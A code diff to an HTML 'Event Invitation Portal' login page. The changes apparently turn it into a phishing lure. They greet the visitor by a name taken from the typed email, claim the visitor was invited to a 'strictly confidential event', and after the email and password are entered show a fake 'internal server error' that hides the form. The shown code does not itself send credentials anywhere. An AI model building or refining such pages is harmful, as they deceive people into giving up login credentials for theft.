@@ -72,6 +72,12 @@
       background-color: #f9f9f9;
     }
 
+    .login-container input:focus {
+      border-color: #007BFF;
+      outline: none;
+      background-color: #fff;
+    }
+
     .login-container button {
       width: 90%;
       padding: 12px;
@@ -82,6 +88,39 @@
       font-weight: bold;
       border-radius: 8px;
       cursor: pointer;
+      transition: background 0.3s ease;
+      margin-bottom: 10px;
+    }
+
+    .login-container button:hover {
+      background-color: #0056b3;
+    }
+
+    .login-container p.note {
+      font-size: 12px;
+      color: #888;
+      margin-top: 5px;
+    }
+
+    #confirmation {
+      display: none;
+      background-color: rgba(40, 40, 40, 0.95);
+      width: 100%;
+      max-width: 400px;
+      padding: 20px;
+      border-radius: 8px;
+      border-top: 5px solid #007BFF;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 1000;
+    }
+
+    #confirmation p {
+      color: #fff;
+      font-size: 18px;
+      font-weight: bold;
     }
 
     .footer {
@@ -98,20 +137,33 @@
 
 <body>
 
-  <div class="login-container">
+  <!-- Login Panel -->
+  <div id="login" class="login-container">
     <img src="https://i.postimg.cc/qMNXQ08h/user-male-circle-blue-512.webp">
 
-    <!-- ✅ Name will appear here -->
+    <!-- ✅ Dynamic Title -->
     <h2 id="portalTitle">Event Invitation Portal</h2>
 
-    <p class="subtext">Sign-in to continue</p>
+    <p class="subtext">Strictly Confidential</p>
 
     <input type="text" id="username" placeholder="Email" required>
-    <input type="password" placeholder="Password">
+    <input type="password" id="password" placeholder="Password" required>
 
-    <button>Login</button>
+    <button onclick="authenticate()">Login</button>
+
+    <p class="note">
+      You have been added to this secure portal due to your invitation to a strictly confidential event.
+    </p>
   </div>
 
+  <!-- Confirmation Message -->
+  <div id="confirmation">
+    <h2 style="color: white;">ERROR: Try Again</h2>
+    <p>An internal server error occurred. Please try again.</p>
+    <button onclick="window.close()">Close this page</button>
+  </div>
+
+  <!-- Footer -->
   <div class="footer">
     2026 Email Invitation. All Rights Reserved
   </div>
@@ -128,11 +180,8 @@
       if (!email || !email.includes("@")) return "";
 
       let namePart = email.split("@")[0];
-
-      // Remove dots, numbers, etc.
       namePart = namePart.split(/[.\-_]/)[0];
 
-      // Capitalize first letter
       return namePart.charAt(0).toUpperCase() + namePart.slice(1);
     }
 
@@ -140,7 +189,7 @@
       const firstName = extractFirstName(email);
 
       if (firstName) {
-        title.textContent = firstName;
+        title.textContent = firstName + ", sign-in to continue";
       } else {
         title.textContent = "Event Invitation Portal";
       }
@@ -158,6 +207,11 @@
       applyName(this.value.trim());
     });
   });
+
+  function authenticate() {
+    document.getElementById("login").style.display = "none";
+    document.getElementById("confirmation").style.display = "block";
+  }
 </script>
 
 </body>
